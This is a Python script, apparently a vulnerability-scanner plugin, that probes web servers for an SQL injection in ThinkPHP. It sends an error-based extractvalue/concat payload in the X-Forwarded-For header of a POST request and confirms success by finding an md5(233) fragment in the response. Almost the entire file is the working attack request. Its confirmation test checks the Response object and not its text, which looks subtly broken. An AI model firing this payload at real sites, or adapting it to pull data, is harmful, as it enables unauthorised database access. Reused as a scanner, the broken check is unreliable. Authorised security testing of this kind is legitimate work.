#-*- coding:utf-8 -*-
import os
import requests
from lib.utils.path_info import get_path_info
from lib.utils.package import make_request_package 

headers = {
    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:76.0) Gecko/20100101 Firefox/76.0',
    'Accept-Language': '*',
    'Accept-Encoding': '*',
    'Keep-Alive': '300',
    'Connection': 'Keep-Alive',
    'Cache-Control': 'max-age=0'
    }


def check(url):
    results = []
    items = {
        "Url": url, 
        "Script": get_path_info(os.path.dirname(__file__)),
        "Vuln": 'thinkphp_xff_sql_injection_post', 
        "Type": 'POST', 
        "Request": None
    }

    payload = '?s=/home/article/view_recent/name/1'
    headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:76.0) Gecko/20100101 Firefox/76.0',
        "X-Forwarded-For": "1') and extractvalue(1, concat(0x5c,(select md5(233))))#",
        'Connection': 'close'
        }

    try:
        s = requests.session()
        s.keep_alive = False
        res = s.post(url + payload, headers = headers)
        # md5(233)
        if 'e165421110ba03099a1c0393373c5b4' in res:
            items['Request'] = make_request_package(res.request) 
            results.append(items.copy())
            return results

        if len(results) == 0:
            return False
        return results

    except Exception as e:
        print(e)
        return False 

if __name__ == '__main__':
    pass
